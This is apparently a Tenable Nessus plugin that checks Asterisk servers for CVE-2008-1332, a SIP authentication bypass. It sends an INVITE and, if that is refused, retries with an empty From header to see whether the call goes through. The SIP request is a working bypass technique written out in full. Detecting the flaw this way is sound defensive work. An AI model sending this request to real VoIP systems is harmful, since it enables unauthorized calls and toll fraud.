#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(32135);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2008-1332");
  script_bugtraq_id(28310);
  script_xref(name:"OSVDB", value:"43415");

  script_name(english:"Asterisk SIP Remote Authentication Bypass");
  script_summary(english:"Sends an INVITE message with an empty From header");

 script_set_attribute(attribute:"synopsis", value:
"It is possible to bypass authentication and make calls using the
remote VoIP service." );
 script_set_attribute(attribute:"description", value:
"The version of Asterisk installed on the remote host allows
unauthenticated calls via the SIP channel driver.  Using a specially-
crafted From header, a remote attack can bypass authentication and
make calls into the context specified in the 'general' section of
'sip.conf'." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/489818/100/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://downloads.digium.com/pub/security/AST-2008-003.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.asterisk.org/node/48466" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Asterisk 1.2.27 / 1.4.18.1 / 1.4.19-rc3 / 1.6.0-beta6,
Asterisk Business Edition B.2.5.1 / C.1.6.2, AsteriskNOW 1.0.2,
Asterisk Appliance Developer Kit 1.4 revision 109393, s800i (Asterisk
Appliance) 1.1.0.2 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("sip_detection.nasl");
  script_require_keys("Services/udp/sip");

  exit(0);
}


include("global_settings.inc");


port = get_kb_item("Services/udp/sip");
if (!port) port = 5060;


# Unless we're paranoid, make sure the remote is running Asterisk.
if (report_paranoia < 2)
{
  banner = get_kb_item("sip/banner/"+port+"/banner");
  if (isnull(banner) || "Asterisk" >!< banner) exit(0);
}


function sip_sendrecv(req)
{
  local_var res, soc;
  global_var port;

  if (isnull(req)) return NULL;

  if (islocalhost()) soc = open_sock_udp(port);
  else soc = open_priv_sock_udp(sport:5060, dport:port);
  if (!soc) return NULL;

  send(socket:soc, data:req);
  res = recv(socket:soc, length:1024);
  close(soc);

  return res;
}


# Try to initiate a call.
data = string(
  'v=0\r\n',
  'o=user1 53655765 2353687637 IN IP4 ',  this_host(), '\r\n',
  's=-\r\n',
  'c=IN IP4 ',  this_host(), '\r\n',
  't=0 0\r\n',
  'm=audio 6000 RTP/AVP 0\r\n',
  'a=rtpmap:0 PCMU/8000'
);

invite = string(
  'INVITE sip:service@', get_host_ip(), ':', port, ' SIP/2.0\r\n',
  'Via: SIP/2.0/UDP ',  this_host(), ':5060;branch=z9hG4bKfe06f452-2dd6-db11-6d02-000b7d0dc672;rport\r\n',
  'From: "', SCRIPT_NAME, '" <sip:nessus@', this_host(), ':', port, '>;tag=de92d852-2dd6-db11-9d02-000b7d0dc672\r\n',
  'To: <sip:nessus@', get_host_ip(), ':', port, '>\r\n',
  'Call-ID: cee2c112a8faaedd9daf1f94a4ce7095@',  this_host(), '\r\n',
  'CSeq: 1 INVITE\r\n',
  "Contact: <sip:nessus@", this_host(), '>\r\n',
  'Max-Forwards: 70\r\n',
  'Subject: ', SCRIPT_NAME, '\r\n',
  'Content-Type: application/sdp\r\n',
  'Content-Length: ', strlen(data), '\r\n\r\n', data
);
res = sip_sendrecv(req:invite);
if (!strlen(res)) exit(0);


# If we get a FORBIDDEN response...
response_code = egrep(pattern:"^SIP/", string:res);
if (response_code && ereg(pattern:"^SIP/[0-9]\.[0-9] 403 ", string:response_code))
{
  # Re-try the call with an empty From line.
  invite2 = invite - strstr(invite, 'From: ') +
    'From: \r\n' +
    strstr(invite, 'To: ');
  invite2 = ereg_replace(pattern:"CSeq: 1 ", replace:"CSeq: 2 ", string:invite2);
  res2 = sip_sendrecv(req:invite2);
  if (!strlen(res2)) exit(0);

  # There's a problem if the call does not yield a 403 response now.
  response_code2 = egrep(pattern:"^SIP/", string:res2);
  if (
    response_code2 && 
    ereg(pattern:"^SIP/[0-9]\.[0-9] ([1235-9][0-9][0-9]|4(0[24-9]|[1-9][0-9])) ", string:response_code2)
  ) security_warning(port);
}
